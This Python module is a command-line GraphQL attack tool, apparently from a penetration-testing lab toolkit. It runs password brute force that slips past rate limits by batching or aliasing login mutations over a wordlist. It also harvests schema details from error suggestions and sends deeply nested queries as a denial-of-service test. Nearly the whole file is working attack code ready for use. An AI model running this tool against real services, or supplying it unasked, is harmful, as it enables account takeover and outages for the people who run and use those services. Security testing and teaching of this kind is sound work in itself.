#!/usr/bin/env python3
"""
redshift_toolkit.web.graphql_attacks — batching / aliasing / suggestion mode.

Modes
-----
1. --batch:    if server accepts JSON arrays as batched ops, send N login
               attempts in one request. Counts as one HTTP request to the
               rate limiter, but N attempts to the auth backend.
2. --alias:    use multiple aliased fields in a single document (alternative
               batching that always works on spec-compliant servers).
3. --suggest:  introspection-disabled servers that still emit "Did you mean
               'X'?" hints can be reverse-engineered by typoing field names.
4. --depth:    submit a deeply-nested cyclic query to test depth limits
               (denial-of-service detector — use carefully).

Usage
-----
  # Detect alias-based brute force possibility on `login`
  python3 -m redshift_toolkit.web.graphql_attacks \\
      --url https://api.example.com/graphql --alias --field login \\
      --args 'username,password' --wordlist-pass /usr/share/wordlists/rockyou.txt \\
      --user admin --batch-size 50

  # Reverse-engineer schema via suggestions
  python3 -m redshift_toolkit.web.graphql_attacks \\
      --url https://api.example.com/graphql --suggest --field user \\
      --candidates user,users,me,profile,account

Author: Redshift Project — Module 15
License: MIT — Lab use only.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from dataclasses import dataclass, asdict, field

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


def _post(url: str, payload, *, headers: list[tuple[str, str]] | None = None,
          tls_verify: bool = True, timeout: float = 30.0):
    h = list(headers or [])
    if not any(k.lower() == "content-type" for k, _ in h):
        h.append(("Content-Type", "application/json"))
    body = json.dumps(payload)
    return send(HttpRequest(method="POST", url=url, headers=h, body=body),
                timeout=timeout, tls_verify=tls_verify, follow_redirects=False)


# ─── BATCH (list-form) ──────────────────────────────────────────────────────
def batch_attack(url: str, field_name: str, arg_pairs: list[dict[str, str]],
                 *, success_pattern: str | None = None,
                 headers: list[tuple[str, str]] | None = None,
                 tls_verify: bool = True, timeout: float = 30.0
                 ) -> tuple[bool, list[dict]]:
    """Send arg_pairs as a JSON array (batch). Each item = one login attempt."""
    docs = []
    for idx, args in enumerate(arg_pairs):
        arg_str = ", ".join(f'{k}: "{v}"' for k, v in args.items())
        docs.append({"query": f"mutation {{ {field_name}({arg_str}) {{ token }} }}"})
    r = _post(url, docs, headers=headers, tls_verify=tls_verify, timeout=timeout)
    text = r.body.decode("utf-8", errors="replace")
    accepted = r.status == 200
    matches = []
    if accepted:
        try:
            data = json.loads(text)
            if isinstance(data, list) and len(data) == len(arg_pairs):
                for i, resp in enumerate(data):
                    if success_pattern and success_pattern in json.dumps(resp):
                        matches.append({"index": i, "args": arg_pairs[i],
                                        "response": resp})
        except json.JSONDecodeError:
            pass
    return accepted, matches


# ─── ALIAS (single-document, always works) ──────────────────────────────────
def alias_attack(url: str, field_name: str, arg_pairs: list[dict[str, str]],
                 *, success_pattern: str | None = None,
                 headers: list[tuple[str, str]] | None = None,
                 tls_verify: bool = True, timeout: float = 30.0
                 ) -> list[dict]:
    """Build a single GraphQL document with N aliases of the same mutation."""
    parts = []
    for i, args in enumerate(arg_pairs):
        arg_str = ", ".join(f'{k}: "{v}"' for k, v in args.items())
        parts.append(f'a{i}: {field_name}({arg_str}) {{ token }}')
    doc = "mutation Brute {\n  " + "\n  ".join(parts) + "\n}"
    r = _post(url, {"query": doc}, headers=headers, tls_verify=tls_verify,
              timeout=timeout)
    text = r.body.decode("utf-8", errors="replace")
    matches = []
    try:
        data = json.loads(text).get("data") or {}
        for i, args in enumerate(arg_pairs):
            v = data.get(f"a{i}")
            if v and (not success_pattern or success_pattern in json.dumps(v)):
                # Heuristic: token field present and non-null = success
                if isinstance(v, dict) and v.get("token"):
                    matches.append({"index": i, "args": args, "response": v})
    except json.JSONDecodeError:
        pass
    return matches


# ─── SUGGEST (Did you mean?) ────────────────────────────────────────────────
SUGGEST_RE = re.compile(r"Did you mean\s+(['\"]?)([\w\-, '\"]+?)\1?\s*\??", re.I)


def suggest_probe(url: str, field_typo: str,
                  *, headers: list[tuple[str, str]] | None = None,
                  tls_verify: bool = True, timeout: float = 30.0
                  ) -> list[str]:
    """Send a deliberately-mistyped field name and parse 'Did you mean?'."""
    doc = f"{{ {field_typo} {{ id }} }}"
    r = _post(url, {"query": doc}, headers=headers, tls_verify=tls_verify,
              timeout=timeout)
    text = r.body.decode("utf-8", errors="replace")
    suggestions = []
    for m in SUGGEST_RE.finditer(text):
        # Suggestions sometimes come comma-separated.
        for tok in re.split(r"[,\s'\"]+", m.group(2)):
            tok = tok.strip().rstrip("?")
            if tok and len(tok) < 60:
                suggestions.append(tok)
    return suggestions


def suggest_explore(url: str, candidates: list[str],
                    *, headers: list[tuple[str, str]] | None = None,
                    tls_verify: bool = True, timeout: float = 30.0
                    ) -> dict[str, list[str]]:
    """For each candidate, deliberately typo it (append 'X') and harvest
    suggestions. Returns map of typo → suggestions."""
    out: dict[str, list[str]] = {}
    for c in candidates:
        typo = c + "X"
        s = suggest_probe(url, typo, headers=headers,
                           tls_verify=tls_verify, timeout=timeout)
        if s:
            out[typo] = s
    return out


# ─── DEPTH (cyclic query DoS test) ──────────────────────────────────────────
def depth_query(field: str, child_field: str, depth: int) -> str:
    inner = "id"
    for _ in range(depth):
        inner = f"{child_field} {{ {inner} }}"
    return f"{{ {field} {{ {inner} }} }}"


def depth_attack(url: str, field: str, child_field: str, depth: int,
                 *, headers: list[tuple[str, str]] | None = None,
                 tls_verify: bool = True, timeout: float = 60.0
                 ) -> tuple[int, str]:
    doc = depth_query(field, child_field, depth)
    r = _post(url, {"query": doc}, headers=headers, tls_verify=tls_verify,
              timeout=timeout)
    return r.status, r.body.decode("utf-8", errors="replace")[:300]


# ─── CLI ────────────────────────────────────────────────────────────────────
def main() -> int:
    ap = argparse.ArgumentParser(description="GraphQL batch/alias/suggest/depth attacks.")
    ap.add_argument("--url", required=True)
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--auth-cookie")
    ap.add_argument("--bearer")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=30.0)
    sp = ap.add_subparsers(dest="mode", required=True)

    b = sp.add_parser("alias", help="alias-batched brute force")
    b.add_argument("--field", required=True, help="mutation name (e.g. login)")
    b.add_argument("--user", required=True)
    b.add_argument("--user-arg", default="username")
    b.add_argument("--pass-arg", default="password")
    b.add_argument("--wordlist", required=True)
    b.add_argument("--batch-size", type=int, default=50)

    bb = sp.add_parser("batch", help="JSON-array batch brute force")
    bb.add_argument("--field", required=True)
    bb.add_argument("--user", required=True)
    bb.add_argument("--user-arg", default="username")
    bb.add_argument("--pass-arg", default="password")
    bb.add_argument("--wordlist", required=True)
    bb.add_argument("--batch-size", type=int, default=50)

    s = sp.add_parser("suggest", help="reverse-engineer schema via suggestions")
    s.add_argument("--candidates", required=True,
                   help="comma-separated candidate field names to typo")

    d = sp.add_parser("depth", help="cyclic depth DoS test")
    d.add_argument("--field", required=True)
    d.add_argument("--child-field", required=True)
    d.add_argument("--depth", type=int, default=10)

    args = ap.parse_args()
    color = sys.stdout.isatty() and "--no-color" not in sys.argv

    headers = []
    if args.auth_cookie:
        headers.append(("Cookie", args.auth_cookie))
    if args.bearer:
        headers.append(("Authorization", f"Bearer {args.bearer}"))
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers.append((k.strip(), v.strip()))

    if args.mode in ("alias", "batch"):
        with open(args.wordlist) as f:
            passwords = [ln.strip() for ln in f if ln.strip()]
        bs = args.batch_size
        total_matches = []
        for i in range(0, len(passwords), bs):
            chunk = passwords[i:i + bs]
            arg_pairs = [{args.user_arg: args.user, args.pass_arg: p}
                         for p in chunk]
            if args.mode == "alias":
                m = alias_attack(args.url, args.field, arg_pairs,
                                  headers=headers,
                                  tls_verify=not args.insecure,
                                  timeout=args.timeout)
            else:
                _, m = batch_attack(args.url, args.field, arg_pairs,
                                     success_pattern="token",
                                     headers=headers,
                                     tls_verify=not args.insecure,
                                     timeout=args.timeout)
            for hit in m:
                p_used = hit["args"].get(args.pass_arg)
                print(paint(f"[+] hit at password: {p_used}", GREEN, color))
                total_matches.append(hit)
            print(f"  scanned {min(i + bs, len(passwords))}/{len(passwords)}")
        if not total_matches:
            print(paint("[-] no successful login in wordlist", YELLOW, color))
        return 0 if not total_matches else 1

    if args.mode == "suggest":
        candidates = [c.strip() for c in args.candidates.split(",") if c.strip()]
        results = suggest_explore(args.url, candidates,
                                   headers=headers,
                                   tls_verify=not args.insecure,
                                   timeout=args.timeout)
        if not results:
            print(paint("[-] no suggestions returned — server may have suggestions disabled",
                        YELLOW, color))
            return 0
        print(paint("[+] field suggestions harvested:", GREEN, color))
        for typo, sugs in results.items():
            print(f"  {typo!r} → {sugs}")
        return 0

    if args.mode == "depth":
        status, excerpt = depth_attack(args.url, args.field, args.child_field,
                                        args.depth, headers=headers,
                                        tls_verify=not args.insecure,
                                        timeout=args.timeout)
        print(f"depth={args.depth} → status {status}")
        print("  excerpt: " + excerpt)
        return 0

    return 0


if __name__ == "__main__":
    sys.exit(main())
